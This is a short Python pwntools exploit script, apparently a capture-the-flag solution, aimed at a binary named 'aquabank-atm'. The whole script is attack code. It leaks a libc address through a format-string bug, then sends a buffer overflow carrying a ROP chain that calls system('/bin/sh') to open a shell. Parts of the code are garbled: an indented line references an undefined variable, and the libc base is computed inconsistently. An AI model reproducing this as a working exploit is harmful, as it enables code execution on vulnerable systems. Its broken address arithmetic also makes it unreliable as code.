#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./aquabank-atm', checksec=True)
context.arch = 'amd64'
context.log_level = 'debug'

libc = ELF('./libc.so.6', checksec=False)
rop_libc = ROP(libc)
rop = ROP(elf)

p = process(elf.path)

OFFSET = 136

RET = rop.find_gadget(['ret'])[0]

# ---------------- STAGE 1: FORMAT STRING ----------------

# scrivo il payload
p.sendlineafter(b"> ", b"1")
p.sendline(b"%33$p")

# trigger della vulnerabilità
p.sendlineafter(b"> ", b"2")

p.recvuntil(b"--- Your customer note ---\n")
leak = int(p.recvline().strip(), 16)

log.info(f"LEAK: {hex(leak)}")

# ---------------- CALCOLO libc_base ----------------

# offset trovato con GDB (dal tuo caso)
OFFSET_LIBC = 0x27f75   # <--- questo funziona per il tuo binario

libc_base = leak 
  libc.address = addr - libc.symbols["__libc_start_main"] - 0x8B

log.info(f"libc_base: {hex(libc_base)}")

# ---------------- PREPARAZIONE ROP ----------------

POP_RDI = libc_base + rop_libc.find_gadget(['pop rdi', 'ret'])[0]
BINSH   = next(libc.search(b"/bin/sh"))
SYSTEM  = libc.sym["system"]

log.info(f"POP_RDI: {hex(POP_RDI)}")
log.info(f"SYSTEM: {hex(SYSTEM)}")
log.info(f"BINSH: {hex(BINSH)}")

# ---------------- STAGE 2: OVERFLOW ----------------

p.sendlineafter(b"> ", b"3")

p.sendlineafter(b"From account:", b"AAAA")
p.sendlineafter(b"Amount:", b"BBBB")

p.recvuntil(b"brief):")

payload = flat(
    b"A"*OFFSET,
    p64(RET),       # alignment
    p64(POP_RDI),
    p64(BINSH),
    p64(SYSTEM)
)

p.sendline(payload)

# ---------------- SHELL ----------------

p.interactive()

